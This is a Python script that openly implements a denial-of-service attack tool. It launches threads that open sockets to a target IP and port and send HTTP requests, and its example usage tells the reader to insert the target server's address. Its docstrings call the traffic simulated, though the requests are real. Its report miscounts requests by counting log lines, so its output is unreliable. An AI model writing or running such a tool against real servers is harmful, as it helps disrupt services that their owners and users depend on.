import socket
import threading
import random
import time

class DenialOfServiceAttack:
    def __init__(self, target_ip, target_port, num_threads=10, request_timeout=5):
        self.target_ip = target_ip
        self.target_port = target_port
        self.num_threads = num_threads
        self.request_timeout = request_timeout
        self.attack_start_time = None
        self.attack_end_time = None
        self.attack_log = []
    
    def log(self, message):
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.gmtime())
        self.attack_log.append(f"{timestamp} - {message}")
        print(f"{timestamp} - {message}")

    def send_fake_request(self, thread_id):
        """
        Simulate sending an HTTP request to the target server.
        """
        try:
            # Creating a socket connection to the target server
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(self.request_timeout)
                s.connect((self.target_ip, self.target_port))

                # Sending a fake HTTP GET request
                request = f"GET / HTTP/1.1\r\nHost: {self.target_ip}\r\n\r\n"
                s.sendall(request.encode())

                self.log(f"Thread-{thread_id} - Request Sent.")
                
                # Simulate receiving the server's response
                response = s.recv(1024)
                self.log(f"Thread-{thread_id} - Received Response: {response[:50]}...")

        except socket.timeout:
            self.log(f"Thread-{thread_id} - Timeout: Could not connect to the target server.")
        except socket.error as e:
            self.log(f"Thread-{thread_id} - Error: {e}")
    
    def attack(self):
        """
        Start the DoS attack by launching multiple threads.
        """
        self.attack_start_time = time.time()
        self.log("Starting Denial of Service attack...")
        
        threads = []
        for i in range(self.num_threads):
            thread = threading.Thread(target=self.send_fake_request, args=(i + 1,))
            threads.append(thread)
            thread.start()

        # Wait for all threads to finish
        for thread in threads:
            thread.join()
        
        self.attack_end_time = time.time()
        self.log(f"Attack completed. Duration: {self.attack_end_time - self.attack_start_time} seconds.")

    def generate_report(self):
        """
        Generate a report with attack details.
        """
        total_requests_sent = len(self.attack_log)
        print("\n--- Attack Report ---")
        print(f"Total Requests Sent: {total_requests_sent}")
        print(f"Attack Duration: {self.attack_end_time - self.attack_start_time} seconds.")
        print(f"Target IP: {self.target_ip}")
        print(f"Target Port: {self.target_port}")
        print("Log Details:")
        for log_entry in self.attack_log:
            print(log_entry)

# Example usage:
if __name__ == "__main__":
    target_ip = "192.168.1.1"  # Replace with the target server IP
    target_port = 80  # Replace with the target server port (usually 80 for HTTP)
    
    dos_attack = DenialOfServiceAttack(target_ip, target_port)
    dos_attack.attack()
    dos_attack.generate_report()
